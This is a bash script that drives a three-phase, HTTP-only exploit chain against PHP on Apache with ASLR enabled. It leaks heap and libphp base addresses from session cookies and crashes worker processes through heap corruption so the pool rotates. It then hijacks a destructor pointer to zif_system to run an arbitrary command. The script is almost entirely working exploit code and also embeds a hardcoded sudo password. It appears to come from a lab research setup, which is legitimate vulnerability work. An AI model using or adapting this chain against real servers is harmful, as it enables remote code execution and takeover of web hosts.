#!/bin/bash
# Full pure-HTTP ASLR-on chain (no target-side PHP, no /proc reads by the target).
#   phase 1 (W1): Set-Cookie heap leak -> Zend MM chunk base
#   rotate worker (same Apache master -> same ASLR bases)
#   phase 2 (W2): Set-Cookie libphp leak -> libphp base (ZVAL_PTR_DTOR)
#   rotate worker
#   phase 3 (W3): upload_progress fake-ref chain, pDestructor=zif_system
set -u
cd /home/debian/php2shell-work
S() { echo debian.qwe123 | sudo -S "$@"; }
master() { pgrep -o -x apache2; }
worker() { local m; m=$(master); [ -n "$m" ] && pgrep -P "$m" -x apache2 | tail -1; }
restart() {
  S bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.5; pkill -9 apache2; sleep 0.5; pkill -9 gdb; /usr/sbin/apache2ctl -k start; sleep 0.6" >/dev/null 2>&1
  for _ in $(seq 1 50); do
    [ -n "$(master)" ] && [ -n "$(worker)" ] && return 0
    sleep 0.1
  done
  return 1
}
# HTTP-only worker rotation: A_bigfields (3MB of live POST strings + OOM)
# leaves the Zend MM heap corrupted; the next session-initializing request
# aborts the child (SIGABRT). prefork forks a new child with the same ASLR
# mappings. No local signal is used.
rotate() {
  local m w nw try
  m=$(master); [ -z "$m" ] && return 1
  for try in 1 2 3; do
    w=$(worker)
    [ -z "$w" ] && sleep 0.5 && continue
    timeout 90 python3 send_a_bigfields.py 1001 3000 12 17 >/dev/null 2>&1
    sleep 0.3
    for btry in 1 2 3; do
      timeout 20 python3 sup_poc.py b >/dev/null 2>&1
      for _ in $(seq 1 40); do
        sleep 0.1
        nw=$(pgrep -P "$m" -x apache2 | tail -1)
        if [ -n "$nw" ] && [ "$nw" != "$w" ]; then sleep 0.3; return 0; fi
      done
    done
  done
  return 1
}
hexadd() { python3 -c "print(hex(int('0x$1',16)+$2))"; }
parse_heap() {
python3 - <<'PY'
import urllib.parse,re
from collections import Counter
try:
    d=open('/tmp/b_numleak2.resp','rb').read()
    m=re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?); path=/', d)
    raw=urllib.parse.unquote_to_bytes(m.group(1).decode('latin1'))
    if len(raw) < 1000:
        print('0'); raise SystemExit
    c=Counter()
    for i in range(len(raw)-8):
        v=int.from_bytes(raw[i:i+8],'little')
        if 0x7f0000000000 <= v < 0x800000000000:
            c[v & ~0x1fffff]+=1
    b=c.most_common(1)[0][0]
    print('%x'%b if (b & 0x1fffff)==0 else '0')
except Exception:
    print('0')
PY
}
parse_lib() {
python3 - <<'PY'
import urllib.parse,re
try:
    d=open('/tmp/b_target.resp','rb').read()
    m=re.search(rb'Set-Cookie: PHPSESSID=([^\r\n]*?); path=/', d)
    raw=urllib.parse.unquote_to_bytes(m.group(1).decode('latin1'))
    if len(raw) < 16:
        print('0'); raise SystemExit
    p=int.from_bytes(raw[8:16],'little')
    b=p-0x613c50
    print('%x'%b if (p & 0x1fffff)==0x13c50 and (b & 0x1fffff)==0 else '0')
except Exception:
    print('0')
PY
}
CMD="${CMD:-id>/tmp/p1}"
restart || { echo "RESTART_FAILED"; exit 1; }
S rm -f /tmp/p1 /tmp/sess_* /tmp/b_numleak2.resp /tmp/b_target.resp >/dev/null 2>&1
# Start from a worker whose history is known: abort the current child via HTTP.
rotate || { echo "ROTATE_FAILED_0"; exit 1; }

# ---- phase 1: heap chunk base (retry on fresh workers) ----
HT=0
for attempt in 1 2 3; do
  W1=$(worker)
  timeout 60 python3 send_a_leak2.py 1001 12 >/dev/null 2>&1
  sleep 0.2
  timeout 30 python3 b_numleak2.py 892 1 0x1000 >/dev/null 2>&1
  HT=$(parse_heap)
  echo "W1=$W1 chunk=0x$HT attempt=$attempt"
  [ "$HT" != "0" ] && break
  rotate || break
done
[ "$HT" = "0" ] && { echo "HEAP_LEAK_FAILED"; exit 1; }
rotate || { echo "ROTATE_FAILED_1"; exit 1; }

# ---- phase 2: libphp base (retry on fresh workers) ----
LIB=0
for attempt in 1 2 3; do
  W2=$(worker)
  timeout 60 python3 send_a_leak3.py 1001 5 39 12 17 >/dev/null 2>&1
  sleep 0.2
  timeout 30 python3 b_target.py 443 16 983 >/dev/null 2>&1
  LIB=$(parse_lib)
  echo "W2=$W2 libphp=0x$LIB attempt=$attempt"
  [ "$LIB" != "0" ] && break
  rotate || break
done
[ "$LIB" = "0" ] && { echo "LIBPHP_LEAK_FAILED"; exit 1; }
rotate || { echo "ROTATE_FAILED_2"; exit 1; }

# ---- phase 3: zif_system RCE (retry on fresh workers if needed) ----
HTDATA=$(hexadd "$HT" 0x6e0d8)
ZIF=$(hexadd "$LIB" 0x43a870)
for attempt in 1 2 3 4 5; do
  W3=$(worker)
  S rm -f /tmp/p1 >/dev/null 2>&1
  timeout 40 python3 send_a_pad.py 17 19 3 12 8:7 7:7 7:7 7:7 7:7 7:7 >/dev/null 2>&1
  sleep 0.3
  timeout 20 python3 send_b_zif.py 15 2 "$HTDATA" "$ZIF" "$CMD" >/dev/null 2>&1
  sleep 0.8
  if [ -f /tmp/p1 ]; then
    echo "W3=$W3 HTDATA=$HTDATA ZIF=$ZIF attempt=$attempt"
    echo "PROOF: $(cat /tmp/p1)"
    exit 0
  fi
  echo "attempt $attempt failed (W3=$W3)"
  rotate || break
done
echo "EXPLOIT_FAILED"
exit 1
